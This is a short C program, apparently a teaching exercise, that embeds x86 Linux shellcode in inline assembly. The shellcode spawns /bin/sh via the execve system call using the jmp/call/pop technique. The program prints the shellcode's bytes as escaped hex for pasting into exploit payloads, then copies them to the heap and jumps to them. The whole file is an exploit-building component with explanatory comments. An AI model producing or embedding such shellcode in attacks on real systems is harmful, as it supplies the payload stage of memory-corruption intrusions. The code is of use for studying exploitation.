#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void
shell_code()
{
	asm (
	    // jump to the end of our shellcode
	    "jmp bar\n"
	    "foo:\n"
	    // call foo put the adress of "/bin/sh" as a return pointer on the stack
	    "popl %esi\n"
	    // to follow structure we need to store commands adress behind the command
	    "movl %esi, 0x08(%esi)\n"
	    // make the command string zero terminated
	    "movb $0x00, 0x07(%esi)\n"
	    "movl $0x00, 0x0c(%esi)\n"
	    // start syscall initialisation
	    // syscall id of execve is 11
	    "mov $0x0b, %eax\n"
	    // execve needs three parameter
	    //  first: the command aka filename
	    "mov %esi, %ebx\n"
	    // second: argument vector of zero terminated char*
	    // for now we need a pointer to an array structure
	    "lea 0x08(%esi), %ecx\n"
	    // third: envp
	    "lea 0x0c(%esi), %edx\n"
	    // finally execute system call interrupt
	    "int $0x80\n"
	    "bar:\n"
	    "call foo\n"
	    ".string \"/bin/sh\"\n"
        );
	return;
}

void
shell_after() {}

char*
mem_dump(unsigned char* start, unsigned char* stop)
{
	// too lazy...no parameter check!?
	unsigned int size = stop - start;
	unsigned int i;

	char* code = malloc(size * sizeof(char));

	for (i = 0; i < size; i++) {
	    if (i % 8 == 0) {
		printf("\n");
	    }
	    printf("\\x%02x ", start[i]);
	}
	printf("\n\n");
	memcpy(code, start, size*sizeof(char));
	return code;
}

int main(int argc, char* argv[])
{
	char* code = mem_dump(
		(unsigned char*) &shell_code,
		(unsigned char*) &shell_after);
	((void (*)()) code)();
	return 0;
}
